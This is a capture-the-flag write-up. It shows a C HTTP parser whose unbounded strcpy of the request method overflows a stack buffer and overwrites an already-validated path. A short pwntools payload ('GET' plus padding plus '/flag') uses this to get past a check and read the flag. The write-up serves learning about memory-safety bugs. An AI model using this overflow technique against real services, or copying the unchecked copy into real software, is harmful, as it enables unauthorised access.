# Haatetepe

Vulnerable function
```c
int parse_request(http_request_header_t *req, char *buf) {
char version_str[16];
  char method_str[16];
  char path[256];
  char *header[3];
  char *token;
  char *saveptr;
  int i = 0;

  token = strtok_r(buf, " \r\n", &saveptr);
  while (token != NULL && i < 3) {
    header[i++] = token;
    token = strtok_r(NULL, " \r\n", &saveptr);
  }

  if (i != 3) {
    return -1;
  }

  strncpy(version_str, header[2], sizeof(version_str) - 1);
  strncpy(path, header[1], sizeof(req->path) - 1);

  /* don't even think about it */
  if (strcmp(path, "/flag") == 0) {
    return -1;
  }

  strcpy(method_str, header[0]);  // buffer overflow
  req->method = parse_method(method_str);
  strcpy(req->path, path); // no overflow

  if (sscanf(version_str, "HTTP/%d.%d", &req->http_major, &req->http_minor) != 2) {
    return -1;
  }

  return 0;
}


enum request_method parse_method(const char *method) {
  if (strncmp(method, "GET", 3) == 0)
    return GET;
  if (strncmp(method, "HEAD", 4) == 0)
    return HEAD;
  return UNKNOWN;
}
```


Time of check / Time of use 

Notice the strcpy(method_str, header[0]); is not a strncpy with a maximum length. The "method" field in the incoming request is not length-capped at the strtok_r nor the strcpy, so a long method-string (HTTP verb) will be copied blindly into method_str, potentially overflowing into the path string, notably after it has been validated to not be /flag

strncmp(method, "GET", 3) in parse_method() ignores everything after "GET", so you can append other stuff and still match the correct method.


Payload

```python
path = b"/"
version_str = b"HTTP/1.1"
method = b"GET"  + cyclic(13) + b"/flag"
payload = flat(
    method, b" ",
    path, b" ",
    version_str
)  
```